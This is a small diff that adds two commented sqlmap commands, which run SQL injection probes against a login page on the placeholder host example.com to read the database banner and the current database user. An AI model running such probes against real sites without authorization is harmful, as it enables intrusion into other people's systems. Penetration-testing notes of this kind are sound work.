@@ -1,0 +1,6 @@
+# Extract database version
+sqlmap -u "http://example.com/login.php?username=admin&password=password" --banner
+
+# Extract current user
+sqlmap -u "http://example.com/login.php?username=admin&password=password" --current-user
+
